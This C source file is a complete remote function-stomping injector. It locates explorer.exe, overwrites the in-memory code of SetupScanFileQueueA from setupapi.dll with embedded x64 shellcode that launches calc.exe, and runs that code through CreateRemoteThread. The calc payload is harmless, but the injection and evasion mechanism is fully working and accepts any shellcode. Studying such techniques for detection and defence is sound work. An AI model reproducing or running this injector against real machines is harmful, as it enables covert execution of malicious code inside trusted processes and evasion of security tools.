#include "Stomp.h"


#define		SACRIFICIAL_DLL            "setupapi.dll"
#define		SACRIFICIAL_FUNC           "SetupScanFileQueueA"
#define		TARGET_PROCESS				L"explorer.exe"


UCHAR Shellcode[] = {
0xfc,0x48,0x83,0xe4,0xf0,
0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,
0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,
0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,
0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,
0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,
0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,
0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,
0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,
0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,
0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,
0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,
0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,
0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,
0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,
0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,
0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,
0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,
0x64,0x2e,0x65,0x78,0x65,0x20,0x2f,0x63,0x20,0x63,0x61,0x6c,
0x63,0x2e,0x65,0x78,0x65,0x00
};


BOOL WritePayload(HANDLE hProcess, PVOID pAddress, PBYTE pPayload, SIZE_T sPayloadSize) {

	DWORD	dwOldProtection = NULL;
	SIZE_T	sNumberOfBytesWritten = NULL;

	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) || sPayloadSize != sNumberOfBytesWritten) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		printf("[!] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
		return FALSE;
	}


	/*

		Compared to local stomping injection, this will use WriteProcessMemory
		because we are injecting to a remote process, this must be used

	*/



	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}


BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, OUT DWORD* PID, OUT HANDLE* hProcess)
{
	fnNtQuerySystemInformation		pNtQuerySystemInformation = NULL;
	ULONG							uReturnLen1 = NULL,
		uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	PVOID							pValueToFree = NULL;
	NTSTATUS						STATUS = NULL;

	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	if (pNtQuerySystemInformation == NULL)
	{
		WARN("GetProcAddress Failed! With an ErrorL %d", GetLastError());
		return FALSE;
	}

	pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL)
	{
		WARN("HeapAlloc Failed! With an ErrorL %d", GetLastError());
		return FALSE;
	}

	pValueToFree = SystemProcInfo;

	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0)
	{
		WARN("NtQuerySystemInformation Failed! With an ErrorL 0x%0.8x", STATUS);
		return FALSE;
	}

	while (TRUE)
	{
		if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0)
		{
			*PID = (DWORD)SystemProcInfo->UniqueProcessId;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			break;
		}

		if (!SystemProcInfo->NextEntryOffset)
			break;

		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	HeapFree(GetProcessHeap(), 0, pValueToFree);

	if (*PID == NULL || *hProcess == NULL)
		return FALSE;
	else
		return TRUE;
}



int wmain(int argc, wchar_t* argv[]) {

	HANDLE		hProcess = NULL,
		hThread = NULL;
	PVOID		pAddress = NULL;

	HMODULE		hModule = NULL;
	DWORD  PID = NULL;

	/*if (argc < 2) {
		wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
		return -1;
	}*/

	wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", TARGET_PROCESS);
	if (!GetRemoteProcessHandle(TARGET_PROCESS, &PID, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}
	printf("[+] DONE \n");
	printf("[i] Found Target Process Pid: %d \n", PID);



	printf("[i] Loading \"%s\"... ", SACRIFICIAL_DLL);
	hModule = LoadLibraryA(SACRIFICIAL_DLL);
	if (hModule == NULL) {
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[+] DONE \n");


	pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
	if (pAddress == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return -1;
	}
	printf("[+] Address Of \"%s\" : 0x%p \n", SACRIFICIAL_FUNC, pAddress);


	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();
	printf("[i] Writing ... ");
	if (!WritePayload(hProcess, pAddress, Shellcode, sizeof(Shellcode))) {
		return -1;
	}
	printf("[+] DONE \n");



	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();

	hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
	if (hThread != NULL)
		WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}